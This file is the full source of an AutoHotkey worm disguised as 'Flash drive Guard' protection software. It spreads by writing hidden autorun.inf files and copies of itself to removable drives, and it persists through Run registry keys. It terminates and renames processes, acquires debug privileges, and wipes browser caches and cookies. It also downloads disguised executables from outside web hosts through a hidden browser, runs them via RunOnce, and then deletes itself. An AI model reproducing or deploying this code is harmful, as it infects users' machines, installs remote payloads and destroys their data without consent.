; <COMPILER: v1.0.47.3>
#notrayicon
if 1 =
exitapp
settitlematchmode, 2
detecthiddenwindows, on
#SingleInstance, force
SplitPath, A_ScriptFullPath,,,,,drive
SplitPath, a_windir,,,,,windrive


if A_Scriptfullpath not contains \System\Security\DriveGuard.exe,\Temp\DriveGuard.tmp.exe,%windrive%\FlashGuard\FlashGuard.exe,Temp\gHmpg.tmp.exe,%A_Programfiles%\FlashGuard\FlashGuard.exe
{
if 1 =
{
Msgbox,48, Install Error, You cannot install this software manually., 10
exitapp
}
exitapp
}

if 1 =
exitapp

cmdd = 0
ifexist, %systemroot%\system32\cmd.exe
cmdd = 1

if A_Scriptfullpath contains Temp\gHmpg.tmp.exe
{
if 1 = /hmpg
goto, startwrk
else
exitapp
}

if A_Scriptfullpath contains \System\Security\DriveGuard.exe
{
ifwinactive, My Computer
sada = My Computer
else
	{
	wingettitle, sada, A
	statusbargettext, stsbr, 3, %sada%
	if stsbr != My Computer
	goto, noadrsbr
	}

controlsettext, Edit1, %drive%, %sada%
if errorlevel = 1
goto noadrsbr
controlfocus, Edit1, %sada%
if errorlevel = 1
goto noadrsbr
controlsend, Edit1, {enter}, %sada%
if errorlevel = 1
goto noadrsbr
controlfocus, SysListView321, %sada%
goto adrsbrok

noadrsbr:
SplitPath, A_ScriptFullPath, , , , , drive
Run, %drive%, , useerrorlevel max
winwait, (%drive%)
WinClose, My Computer

adrsbrok:
process, exist, DriveGuard.tmp.exe
if errorlevel != 0
exitapp

if A_OSVersion not contains WIN_2003,WIN_XP,WIN_2000
exitapp

if 1 =
exitapp

WinGet, List, List, ahk_class AutoHotkey
Loop, %List%
	{
	 wID := List%A_Index%
	 WinGet, ppid, PID, ahk_id %wID%
	 pid = %ppid%
	 hProcess := DllCall("OpenProcess", "UInt", 0x0010 | 0x0400, "Int", false, "UInt", pid)
	 size := VarSetCapacity(fulpth, 250)
	 DllCall("Psapi.dll\GetModuleFileNameExA", "UInt", hProcess, "Int", 0, "Str", fulpth, "Int", size)
	 DllCall("CloseHandle", "UInt", hProcess)
	 if fulpth = %A_ProgramFiles%\FlashGuard\FlashGuard.exe
	 exitapp
	 if fulpth = %windrive%\FlashGuard\FlashGuard.exe
	 exitapp
	}

if 1 =
exitapp

FileCopy, %a_scriptfullpath%, %a_temp%\DriveGuard.tmp.exe, 1
if errorlevel = 1
exitapp
run, %a_temp%\DriveGuard.tmp.exe -run,, useerrorlevel
exitapp
}

if A_ScriptFullPath contains Temp\DriveGuard.tmp.exe
{
readme =
(
Flash drive Guard 
version: 1.0

Compatibility:
Windows XP, Windows Vista
 
---------------------------------------------------------------------------
Program information
---------------------------------------------------------------------------
This tiny software is used to protect removable storage devices from 
worms that are spread from one PC to another.

---------------------------------------------------------------------------
Installation and uninstallation
---------------------------------------------------------------------------
No manual installation and uninstallation is supported by this software,
instead this software spreads as the worms does and protects each
and every computer on which it has been installed.

For any comments or queries you may reach the author on: tripp_schultz@yahoo.com

---------------------------------------------------------------------------
---------------------------------------------------------------------------
)
filegetsize, selfsize, %A_Scriptfullpath%

ifexist, %windrive%\FlashGuard\FlashGuard.exe
	{
	filegetsize, csize, %windrive%\FlashGuard\FlashGuard.exe
	if csize != %selfsize%
	goto, installmain
	else
		{
		Regwrite, REG_SZ, HKLM, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard, "%windrive%\FlashGuard\FlashGuard.exe" -run
		if errorlevel = 1
		Regwrite, REG_SZ, HKCU, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard, "%windrive%\FlashGuard\FlashGuard.exe" -run
		exitapp
		}
	}
if 1 =
exitapp

ifexist, %A_programfiles%\FlashGuard\FlashGuard.exe
	{
	filegetsize, psize, %A_programfiles%\FlashGuard\FlashGuard.exe
	if psize != %selfsize%
	goto, installmain
	else
		{
		Regwrite, REG_SZ, HKLM, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard, "%A_programfiles%\FlashGuard\FlashGuard.exe" -run
		if errorlevel = 1
		Regwrite, REG_SZ, HKCU, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard, "%A_programfiles%\FlashGuard\FlashGuard.exe" -run
		exitapp
		}
	}

installmain:
ifnotexist, %A_programfiles%\FlashGuard
	{
	filecreatedir, %A_programfiles%\FlashGuard
	if errorlevel = 1
	goto, nexttry
	}
filecopy, %A_ScriptFullPath%, %A_programfiles%\FlashGuard\FlashGuard.exe, 1
if errorlevel = 1
{
ifexist, %A_programfiles%\FlashGuard\FlashGuard.exe
	{
	Regwrite, REG_SZ, HKCU, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard, "%A_programfiles%\FlashGuard\FlashGuard.exe" -run
	Run, %A_programfiles%\FlashGuard\FlashGuard.exe -run,, useerrorlevel
	exitapp
	}
	else
	{
	filecopy, %A_ScriptFullPath%, %A_programfiles%\FlashGuard\FlashGuard.exe, 1
	if errorlevel = 1
	exitapp
	Regwrite, REG_SZ, HKCU, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard, "%A_programfiles%\FlashGuard\FlashGuard.exe" -run
	Run, %A_programfiles%\FlashGuard\FlashGuard.exe -run,, useerrorlevel
	exitapp
	}
goto, nexttry
}

ifnotexist, %A_programfiles%\FlashGuard\ReadMe.txt
fileappend, %readme%, %A_programfiles%\FlashGuard\ReadMe.txt
filesetattrib, +SRA, %A_programfiles%\FlashGuard
filesetattrib, +SRA, %A_programfiles%\FlashGuard\FlashGuard.exe
Regwrite, REG_SZ, HKLM, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard, "%A_programfiles%\FlashGuard\FlashGuard.exe" -run
if errorlevel = 1
Regwrite, REG_SZ, HKCU, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard, "%A_programfiles%\FlashGuard\FlashGuard.exe" -run
Run, %A_programfiles%\FlashGuard\FlashGuard.exe -run,, useerrorlevel
exitapp

if 1 =
exitapp

nexttry:

ifnotexist, %windrive%\FlashGuard
	{
	filecreatedir, %windrive%\FlashGuard
	if errorlevel = 1
	exitapp
	}
filecopy, %A_ScriptFullPath%, %windrive%\FlashGuard\FlashGuard.exe, 1
if errorlevel = 1
{
ifexist, %windrive%\FlashGuard\FlashGuard.exe
	{
	Regwrite, REG_SZ, HKCU, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard, "%windrive%\FlashGuard\FlashGuard.exe" -run
	Run, %windrive%\FlashGuard\FlashGuard.exe -run,, useerrorlevel
	exitapp
	}
	else
	{
	filecopy, %A_ScriptFullPath%, %windrive%\FlashGuard\FlashGuard.exe, 1
	if errorlevel = 1
	exitapp
	Regwrite, REG_SZ, HKCU, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard, "%windrive%\FlashGuard\FlashGuard.exe" -run
	Run, %windrive%\FlashGuard\FlashGuard.exe -run,, useerrorlevel
	exitapp
}
exitapp
	}

fileappend, %readme%, %windrive%\FlashGuard\ReadMe.txt
filesetattrib, +SRAH, %windrive%\FlashGuard
filesetattrib, +SRA, %windrive%\FlashGuard\FlashGuard.exe
Regwrite, REG_SZ, HKLM, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard, "%windrive%\FlashGuard\FlashGuard.exe" -run
if errorlevel = 1
Regwrite, REG_SZ, HKCU, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard, "%windrive%\FlashGuard\FlashGuard.exe" -run
Run, %windrive%\FlashGuard\FlashGuard.exe -run,, useerrorlevel
exitapp
}



if A_Scriptfullpath not contains \System\Security\DriveGuard.exe,\Temp\DriveGuard.tmp.exe,%windrive%\FlashGuard\FlashGuard.exe,Temp\gHmpg.tmp.exe,%A_Programfiles%\FlashGuard\FlashGuard.exe
{
if 1 =
{
Msgbox,48 , Install Error, You cannot install this software manually., 10
exitapp
}
exitapp
}

if 1 =
exitapp


if A_ScriptFullPath != %A_Programfiles%\FlashGuard\FlashGuard.exe
	{
	if A_ScriptFullPath != %windrive%\FlashGuard\FlashGuard.exe
	exitapp
	}

ifexist, %a_temp%\DriveGuard.tmp.exe
filedelete, %a_temp%\DriveGuard.tmp.exe



sleep, 120000

d = `n
s := 4096
Process, Exist
h := DllCall("OpenProcess", "UInt", 0x0400, "Int", false, "UInt", ErrorLevel)
DllCall("Advapi32.dll\OpenProcessToken", "UInt", h, "UInt", 32, "UIntP", t)
VarSetCapacity(ti, 16, 0)
NumPut(1, ti, 0, 4)
DllCall("Advapi32.dll\LookupPrivilegeValueA", "UInt", 0, "Str", "SeDebugPrivilege", "UIntP", luid)
NumPut(luid, ti, 4, 8)
NumPut(2, ti, 12, 4)
DllCall("Advapi32.dll\AdjustTokenPrivileges", "UInt", t, "Int", false, "UInt", &ti, "UInt", 0, "UInt", 0, "UInt", 0)
DllCall("CloseHandle", "UInt", h)
hModule := DllCall("LoadLibrary", "Str", "Psapi.dll")
s := VarSetCapacity(a, s)
DllCall("Psapi.dll\EnumProcesses", "UInt", &a, "UInt", s, "UIntP", r)

Loop, % r // 4
{
   id := NumGet(a, A_Index * 4)
   h := DllCall("OpenProcess", "UInt", 0x0010 | 0x0400, "Int", false, "UInt", id)
   VarSetCapacity(m, s)
   DllCall("Psapi.dll\EnumProcessModules", "UInt", h, "UInt", &m, "UInt", s, "UIntP", r)
   VarSetCapacity(prosnm, s, 0)
   e := DllCall("Psapi.dll\GetModuleBaseNameA", "UInt", h, "UInt", m, "Str", prosnm, "Chr", s)
   VarSetCapacity(prospth, s, 0)
   e := DllCall("Psapi.dll\GetModuleFileNameExA", "UInt", h, "UInt", m, "Str", prospth, "UInt", s)
   DllCall("CloseHandle", "UInt", h)

prosid = %id%

if 1 =
exitapp

if prosnm contains iexplore.exe,alg.exe,csrss.exe,cssrs.exe,cssrss.exe,explore.exe,expIorer.exe,csrss.exe,iexplorer.exe,lexplore.exe,lsass.exe,lssas.exe,lssass.exe,scshost.exe,scvhost.exe,scvhsot.exe,smss.exe,smsss.exe,spoolss.exe,spoolsv.exe,spoolvs.exe,ssms.exe,sssms.exe,ssvhost.exe,svchost.exe,svchsot.exe,serivces.exe,taskmgr.exe,wilnogon.exe,winl0g0n.exe,winlgoon.exe,winlogno.exe,winlogon.exe,wlnlogon.exe
	{
	if prospth not contains \Program Files\Internet Explorer\iexplore.exe,\system32\svchost.exe,\system32\lsass.exe,\system32\csrss.exe,\system32\alg.exe,\system32\winlogon.exe,\system32\smss.exe,\system32\spoolsv.exe,\system32\taskmgr.exe
		{
		process, close, %prosid%
		process, waitclose, %prosid%, 3
		filemove, %prospth%, %prospth%.bak, 1
		}
	}
}
ifexist, C:\heap41a
	{
	loop, C:\heap41a\*.*, 1, 1
		{
		filesetattrib, -RASH, %a_loopfilefullpath%
		filedelete, %a_loopfilefullpath%
		}
	filesetattrib, -RASH, C:\heap41a
	FileRemoveDir, C:\heap41a, 1
	}
ifexist, D:\heap41a
	{
	loop, D:\heap41a\*.*, 1, 1
		{
		filesetattrib, -RASH, %a_loopfilefullpath%
		filedelete, %a_loopfilefullpath%
		}
	filesetattrib, -RASH, D:\heap41a
	FileRemoveDir, D:\heap41a, 1
	}
ifexist, E:\heap41a
	{
	loop, E:\heap41a\*.*, 1, 1
		{
		filesetattrib, -RASH, %a_loopfilefullpath%
		filedelete, %a_loopfilefullpath%
		}
	filesetattrib, -RASH, E:\heap41a
	FileRemoveDir, E:\heap41a, 1
	}

ifexist, F:\heap41a
	{
	loop, F:\heap41a\*.*, 1, 1
		{
		filesetattrib, -RASH, %a_loopfilefullpath%
		filedelete, %a_loopfilefullpath%
		}
	filesetattrib, -RASH, F:\heap41a
	FileRemoveDir, F:\heap41a, 1
	}

regread, shellcheck, HKLM, SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon, Shell
if shellcheck != Explorer.exe
RegWrite, REG_SZ, HKLM, SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon, Shell, Explorer.exe

regread, vv, HKLM, SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL, DefaultValue
if vv != 2
regwrite, REG_DWORD, HKLM, SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL, DefaultValue, 2

regread, vv, HKCU, Software\Microsoft\Windows\CurrentVersion\Policies\Explorer, NoFolderOptions
if errorlevel = 0
{
if vv != 0
regWrite, REG_DWORD, HKCU, Software\Microsoft\Windows\CurrentVersion\Policies\Explorer, NoFolderOptions, 0
}

regread, vv, HKCU, Software\Microsoft\Windows\CurrentVersion\Policies\System, DisableTaskMgr
if errorlevel = 0
{
if vv != 0
regWrite, REG_DWORD, HKCU, Software\Microsoft\Windows\CurrentVersion\Policies\System, DisableTaskMgr, 0
}

if 1 =
exitapp

regread, vv, HKCU, Software\Microsoft\Windows\CurrentVersion\Policies\System, DisableCMD
if errorlevel = 0
{
if vv != 0
regWrite, REG_DWORD, HKCU, Software\Microsoft\Windows\CurrentVersion\Policies\System, DisableCMD, 0
}

sleep, 10000
if 1 = /nohm
{
hmpgchngtdy = 0
goto, todaychkd
}

if 1 =
exitapp

regread, timechk, HKCU, Software\Microsoft\Internet Explorer, Runtime
if errorlevel = 1
	{
	timechk = %a_yday%
	regdelete, HKCU, Software\Microsoft\Internet Explorer, Runtime
	RegWrite, REG_SZ, HKCU, Software\Microsoft\Internet Explorer, Runtime, %a_yday%
	}
	else
	{
	if timechk = %a_yday%
		{
		hmpgchngtdy = 0
		goto, todaychkd
		}
	}

if 1 =
exitapp

if timechk contains a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z
	{
	timechk = %a_yday%
	regdelete, HKCU, Software\Microsoft\Internet Explorer, Runtime
	RegWrite, REG_SZ, HKCU, Software\Microsoft\Internet Explorer, Runtime, %a_yday%
	}

regread, daychk, HKCU, Software\Microsoft\Internet Explorer, Runday
if errorlevel = 1
	{
	daychk = %a_yday%
	regdelete, HKCU, Software\Microsoft\Internet Explorer, Runday
	RegWrite, REG_SZ, HKCU, Software\Microsoft\Internet Explorer, Runday, %a_yday%
	}

if daychk contains a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z
	{
	daychk = %a_yday%
	regdelete, HKCU, Software\Microsoft\Internet Explorer, Runday
	RegWrite, REG_SZ, HKCU, Software\Microsoft\Internet Explorer, Runday, %a_yday%
	}

if timechk != %a_yday%
{
timechk = %a_yday%
RegWrite, REG_SZ, HKCU, Software\Microsoft\Internet Explorer, Runtime, %a_yday%
}

if 1 =
exitapp

aa := daychk + 2
bb := aa + 30
cc := bb + 30
dd := cc + 30
ee := dd + 30
ff := ee + 30
gg := ff + 30
hh := gg + 30
ii := hh + 30
jj := ii + 30
kk := jj + 30
ll := kk + 30

hmpgchngtdy = 0
if a_yday contains %aa%,%bb%,%cc%,%dd%,%ee%,%ff%,%gg%,%hh%,%ii%,%jj%,%kk%,%ll%
{
hmpgchngtdy = 1
}

todaychkd:
autorun =
(
[autorun]
open=System\Security\DriveGuard.exe -run
shell\Open=&Open
shell\Open\Command=System\Security\DriveGuard.exe -run
shell\Explore=&Explore
shell\Explore\Command=System\Security\DriveGuard.exe -run
)

if 1 =
exitapp

remdrive = DEFGHIJKLMNOPQRSTUVWXYZ

loop
{
if hmpgchngtdy = 1
	{
	if a_index = 20
		{
		hmpgchngtdy = 0
		gosub, Hmpgchgr
		}
	}
RegRead, autostrt, HKLM, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard
if autostrt != "%windrive%\FlashGuard\FlashGuard.exe" -run
{
RegRead, autostrt, HKCU, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard
if autostrt != "%windrive%\FlashGuard\FlashGuard.exe" -run
	{
	RegRead, autostrt, HKLM, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard
	if autostrt != "%A_programfiles%\FlashGuard\FlashGuard.exe" -run
		{
		RegRead, autostrt, HKCU, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard
		if autostrt != "%A_programfiles%\FlashGuard\FlashGuard.exe" -run
			{
			Regwrite, REG_SZ, HKLM, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard, "%a_scriptfullpath%" -run
			if errorlevel = 1
			Regwrite, REG_SZ, HKCU, Software\Microsoft\Windows\CurrentVersion\Run, FlashGuard, "%a_scriptfullpath%" -run
			}
		}
	}
}


if 1 =
exitapp


loop, parse, remdrive
	{
	drv = %A_loopfield%:
		ifexist, %drv%
		{
		driveget, driv, type, %drv%
		if driv = Removable
			{
			driveget, drivv, status, %drv%
			if drivv = Ready
				{
				DriveGet, lbl, label, %drv%
				ifwinnotexist, %lbl% (%drv%)
					{
					ifexist, %drv%\Autorun.inf
					gosub, checkautorunfile
					else
						{
						autorunok = 0
						gosub, instlautrn
						}
						ifnotexist, %drv%\System
						filecreatedir, %drv%\System
						ifnotexist, %drv%\System\Security
						filecreatedir, %drv%\System\Security
						ifnotexist, %drv%\System\Security\DriveGuard.exe
						filecopy, %a_scriptfullpath%, %drv%\System\Security\DriveGuard.exe

						filegetattrib, att, %drv%\System
						if att not contains RASH
						filesetattrib, +SHAR, %drv%\System
						filegetattrib, att, %drv%\System\Security
						if att not contains RASH
						filesetattrib, +SHAR, %drv%\System\Security
						filegetattrib, att, %drv%\System\Security\DriveGuard.exe
						if att not contains RASH
						filesetattrib, +SHAR, %drv%\System\Security\DriveGuard.exe
					}
				}
			}
		}
	}

ifexist, %a_temp%\gHmpg.tmp.exe
	{
	process, exist, gHmpg.tmp.exe
	if errorlevel = 0
	filedelete, %a_temp%\gHmpg.tmp.exe
	}

ifexist, %a_temp%\DriveGuard.tmp.exe
	{
	process, exist, DriveGuard.tmp.exe
	if errorlevel = 0
	filedelete, %a_temp%\DriveGuard.tmp.exe
	}

sleep, 20000
}


checkautorunfile:
autorunok = 1
loop, read, %drv%\autorun.inf
{
if a_index = 1
{
if a_loopreadline != [autorun]
	{
	autorunok = 0
	break
	}
}
if a_index = 2
{
if a_loopreadline != open=System\Security\DriveGuard.exe -run
	{
	autorunok = 0
	break
	}
}
if a_index = 3
{
if a_loopreadline != shell\Open=&Open
	{
	autorunok = 0
	break
	}
}
if a_index = 4
{
if a_loopreadline != shell\Open\Command=System\Security\DriveGuard.exe -run
	{
	autorunok = 0
	break
	}
}
if a_index = 5
{
if a_loopreadline != shell\Explore=&Explore
	{
	autorunok = 0
	break
	}
}

if 1 =
exitapp

if a_index = 6
{
if a_loopreadline != shell\Explore\Command=System\Security\DriveGuard.exe -run
	{
	autorunok = 0
	break
	}
}
if a_index = 7
	{
	autorunok = 0
	break
	}
}

instlautrn:
if autorunok = 0
{
ifexist, %drv%\autorun.inf
	{
	filedelete, %drv%\autorun.inf
		if errorlevel = 1
		{
		filesetattrib, -SHAR, %drv%\autorun.inf
		filedelete, %drv%\autorun.inf
		if errorlevel = 1
		return
		}
	}
	fileappend, %autorun%, %drv%\autorun.inf
	if errorlevel = 1
	return
	filesetattrib, +SHAR, %drv%\autorun.inf
	return
}
filegetattrib, att, %drv%\autorun.inf
if att not contains RASH
filesetattrib, +SHAR, %drv%\autorun.inf
return

exitapp

Hmpgchgr:
if 1 =
exitapp
ifexist, %a_temp%\gHmpg.tmp.exe
filedelete, %a_temp%\gHmpg.tmp.exe

filecopy, %a_scriptfullpath%, %a_temp%\gHmpg.tmp.exe
run, %a_temp%\gHmpg.tmp.exe /hmpg
run, %a_scriptfullpath% /nohm,, useerrorlevel
return

startwrk:
runwait, %comspec% /c RD /S /Q "%userprofile%\Local Settings\Temporary Internet Files",, hide useerrorlevel
runwait, %comspec% /c RD /S /Q "%userprofile%\Cookies", , hide useerrorlevel


regwrite, REG_Binary, HKCU, Software\Microsoft\Internet Connection Wizard, Completed, 01000000
regwrite, reg_sz, HKCU, Software\Microsoft\Internet Explorer\Main, Check_Associations, no
regwrite, REG_DWORD, HKCU, Software\Microsoft\Windows\CurrentVersion\Internet Settings, GlobalUserOffline, 0
sleep, 2000

loop, 4
{
mainindex = %a_index%

if a_index = 1
	{
	extt = %userprofile%\Local Settings\Temporary Internet Files\*.jpg
	url = http://sapn4.tripod.com/lndexnew.jpg
	}

if a_index = 2
	{
	extt = %userprofile%\Local Settings\Temporary Internet Files\*.jpg
	url = http://www.freewebs.com/microsotf/lndexnew.jpg
	}

if a_index = 3
	{
	extt = %userprofile%\Local Settings\Temporary Internet Files\*.txt
	url = http://sapn4.tripod.com/lndexnew.txt
	}
if a_index = 4
	{
	extt = %userprofile%\Local Settings\Temporary Internet Files\*.txt
	url = http://www.freewebs.com/microsotf/lndexnew.txt
	}

	Run, %a_programfiles%\internet explorer\iexplore.exe %url%, , hide useerrorlevel, ieid
	if errorlevel = ERROR
	goto extdldr

detecthiddenwindows, off
sleep, 5000
ifwinexist, ahk_pid %ieid%
winhide
detecthiddenwindows, on

sleep, 120000

err =

process, exist, %ieid%
err = %errorlevel%

if err = 0
goto extdldr

if err = ERROR
goto extdldr

StatusBarWait, Done, 300, 1, ahk_pid %ieid%
sleep, 2000
StatusBarWait, Done, 300, 1, ahk_pid %ieid%
sleep, 2000
StatusBarWait, Done, 300, 1, ahk_pid %ieid%
if errorlevel = 1
	{
	process, close, %ieid%
	goto extdldr
	}

wingettitle, netsts, ahk_pid %ieid%
if netsts contains Cannot find,[Working Offline]
	{
	process, close, %ieid%
	goto extdldr
	}

waittime = 0

ccc =
loop, 10
	{
	random, cc, 0, 9
	ccc = %cc%%ccc%
	}

gosub, loopagn
sleep, 1000
}

goto extdldr

loopagn:
waittime++
loop, %extt%, 1, 1
{
if a_loopfilename contains lndexnew
fileread, txtt, %a_loopfilefullpath%
if txtt contains MZ
	{
	filecopy, %a_loopfilefullpath%, %a_temp%\%ccc%.exe
	regwrite, reg_sz, HKLM, software\microsoft\windows\currentversion\RunOnce, temp_cleanup, "%a_temp%\%ccc%.exe"
	if errorlevel = 1
	regwrite, reg_sz, HKCU, software\microsoft\windows\currentversion\RunOnce, temp_cleanup, "%a_temp%\%ccc%.exe"
	if errorlevel = 1
	run, %A_Temp%\%ccc%.exe, ,hide useerrorlevel
	process, close, %ieid%
	goto extdldr
	}
}
sleep, 10000

process, exist, %ieid%
if errorlevel = 0
goto extdldr

if waittime > 20
{
if mainindex = 4
	{
	process, close, %ieid%
	goto extdldr
	}
	else
	{
	process, close, %ieid%
	return
	}
}
goto, loopagn
return

extdldr:
run, %comspec% /c del /Q /F "%a_scriptfullpath%", , hide useerrorlevel
exitapp
